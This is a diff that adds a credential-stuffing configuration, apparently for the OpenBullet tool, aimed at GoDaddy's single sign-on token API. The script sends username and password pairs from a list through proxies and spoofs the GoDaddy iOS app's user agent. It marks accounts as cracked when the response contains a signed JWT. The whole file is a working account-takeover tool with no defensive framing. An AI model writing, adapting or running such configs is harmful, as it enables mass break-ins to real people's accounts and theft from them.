@@ -1,0 +1,48 @@
+[SETTINGS]
+{
+  "Name": "GoDaddy",
+  "SuggestedBots": 1,
+  "MaxCPM": 0,
+  "LastModified": "2019-07-24T06:50:04.8847118+05:30",
+  "AdditionalInfo": "",
+  "Author": "SATAN666",
+  "Version": "1.0.0",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST POST "https://sso.godaddy.com/v1/api/token" 
+  CONTENT "{\"username\":\"<USER>\",\"per\":\"true\",\"password\":\"<PASS>\",\"infotoken\":\"true\"}" 
+  CONTENTTYPE "application/json" 
+  HEADER "Content-Type: application/json" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: go/3.3.0 (com.godaddy.goapp; build:62; iOS 11.3.1) Alamofire/4.5.1" 
+  HEADER "Accept-Language: en;q=1.0" 
+  HEADER "Content-Length: 77" 
+  HEADER "Accept-Encoding: gzip;q=1.0, compress;q=0.5" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "Failed to authenticate user. Unsuccessful authentication attempt." 
+  KEYCHAIN Success OR 
+    KEY "signed jwt" 
+
